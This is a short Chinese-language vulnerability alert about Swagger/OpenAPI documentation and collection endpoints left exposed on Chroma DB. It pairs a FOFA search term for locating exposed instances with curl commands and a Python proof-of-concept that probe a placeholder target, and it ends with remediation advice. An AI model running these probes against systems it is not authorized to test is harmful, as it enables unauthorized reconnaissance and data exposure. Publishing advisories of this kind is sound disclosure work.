---
title: 【漏洞预警】Chroma DB Swagger 敏感信息泄露
---

## 漏洞概述
Chroma DB 是一款开源向量数据库，系统存在 swagger 敏感信息泄露漏洞，攻击者可通过访问 swagger 文档获取 API 接口信息，可能导致进一步攻击。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | Chroma DB swagger 敏感信息泄露漏洞 |
| 漏洞类型 | 敏感信息泄露 |
| 影响组件 | swagger docs |
| 严重程度 | 中危 |

## FOFA查询
```
Chroma
```

## POC
```bash
# 检查 swagger 文档
curl -s "http://target:8000/docs/"
curl -s "http://target:8000/openapi.json"
curl -s "http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections"
```

或

```python
import requests

paths = [
    "/api/v2/tenants/default_tenant/databases/default_database/collections",
    "/api/v1/collections?tenant=default_tenant&database=default_database",
    "/docs/",
    "/openapi.json"
]
target = "http://target:8000"
for path in paths:
    r = requests.get(target + path)
    if r.status_code == 200:
        print(f"[+] {path} 存在swagger泄露")
```

## 修复建议
1. 升级到最新版本
2. 限制 swagger 文档访问
3. 实施认证机制